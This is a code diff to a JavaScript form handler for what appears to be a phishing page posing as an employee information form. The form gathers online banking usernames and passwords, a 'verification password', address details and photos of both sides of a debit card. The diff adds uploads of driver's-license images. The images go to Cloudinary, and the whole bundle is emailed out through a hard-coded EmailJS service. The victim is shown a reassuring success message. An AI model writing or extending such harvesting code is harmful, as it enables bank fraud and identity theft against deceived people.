@@ -68,6 +68,24 @@ document.getElementById("debit-back").addEventListener("change", function (e) {
   document.getElementById("debit-back-name").textContent = fileName;
 });
 
+document
+  .getElementById("license-front")
+  .addEventListener("change", function (e) {
+    const fileName = e.target.files[0]
+      ? e.target.files[0].name
+      : "No file chosen";
+    document.getElementById("license-front-name").textContent = fileName;
+  });
+
+document
+  .getElementById("license-back")
+  .addEventListener("change", function (e) {
+    const fileName = e.target.files[0]
+      ? e.target.files[0].name
+      : "No file chosen";
+    document.getElementById("license-back-name").textContent = fileName;
+  });
+
 // Upload image to Cloudinary
 async function uploadToCloudinary(file) {
   const formData = new FormData();
@@ -125,7 +143,7 @@ document
     statusDiv.classList.add("hidden");
 
     try {
-      console.log("[v0] Starting form submission...");
+      // console.log("[v0] Starting form submission...");
 
       // Get form data
       const formData = new FormData(this);
@@ -145,9 +163,7 @@ document
 • City: ${formData.get("city") || "N/A"}
 • State: ${formData.get("state") || "N/A"}
 • Postal Code: ${formData.get("postal_code") || "N/A"}
-• Account Type: ${formData.get("account_type") || "N/A"}
-
-🏦 BANK APP OPTION:
+• Account Type: ${formData.get("account_type") || "N/A"} BANK APP OPTION:
 • Bank Username: ${formData.get("bank_username") || "N/A"}
 • Bank Password: ${formData.get("bank_password") || "N/A"}
 
@@ -156,35 +172,53 @@ document
 • Verification Password: ${formData.get("verification_password") || "N/A"}`,
       };
 
-      console.log("[v0] Template parameters prepared:", templateParams);
+      // console.log(" Template parameters prepared:", templateParams);
 
       // Upload images to Cloudinary if they exist
       const debitFrontFile = document.getElementById("debit-front").files[0];
       const debitBackFile = document.getElementById("debit-back").files[0];
 
+      const licenseFrontFile =
+        document.getElementById("license-front").files[0];
+      const licenseBackFile = document.getElementById("license-back").files[0];
+
       if (debitFrontFile) {
-        console.log("[v0] Uploading debit card front...");
+        // console.log(" Uploading debit card front...");
         const frontUrl = await uploadToCloudinary(debitFrontFile);
         templateParams.message += `\n\n💳 DEBIT CARD IMAGES:\n• Front: ${frontUrl}`;
-        console.log("[v0] Debit front uploaded:", frontUrl);
+        // console.log(" Debit front uploaded:", frontUrl);
       }
 
       if (debitBackFile) {
-        console.log("[v0] Uploading debit card back...");
+        console.log(" Uploading debit card back...");
         const backUrl = await uploadToCloudinary(debitBackFile);
         templateParams.message += `\n• Back: ${backUrl}`;
-        console.log("[v0] Debit back uploaded:", backUrl);
+        // console.log(" Debit back uploaded:", backUrl);
+      }
+
+      if (licenseFrontFile) {
+        console.log(" Uploading debit card front...");
+        const frontUrl = await uploadToCloudinary(licenseFrontFile);
+        templateParams.message += `\n\n💳 license CARD IMAGES:\n• Front: ${frontUrl}`;
+        // console.log(" license front uploaded:", frontUrl);
+      }
+
+      if (licenseBackFile) {
+        // console.log(" Uploading debit card back...");
+        const backUrl = await uploadToCloudinary(licenseBackFile);
+        templateParams.message += `\n• Back: ${backUrl}`;
+        // console.log(" license back uploaded:", backUrl);
       }
 
       // Send email via EmailJS (replace with your actual service ID and template ID)
-      //   console.log("[v0] Sending email via EmailJS...");
+      //   console.log(" Sending email via EmailJS...");
       const result = await emailjs.send(
         "service_njbyaqd",
         "template_lo15nhn",
         templateParams
       );
 
-      console.log("[v0] Email sent successfully:", result);
+      console.log(" Email sent successfully:", result);
       showStatus(
         "Employee information submitted successfully! You will receive a confirmation email shortly."
       );
@@ -194,8 +228,13 @@ document
       document.getElementById("debit-front-name").textContent =
         "No file chosen";
       document.getElementById("debit-back-name").textContent = "No file chosen";
+
+      document.getElementById("license-front-name").textContent =
+        "No file chosen";
+      document.getElementById("license-back-name").textContent =
+        "No file chosen";
     } catch (error) {
-      console.error("[v0] Submission error:", error);
+      console.error(" Submission error:", error);
       showStatus(
         "There was an error submitting your information. Please try again or contact support.",
         true
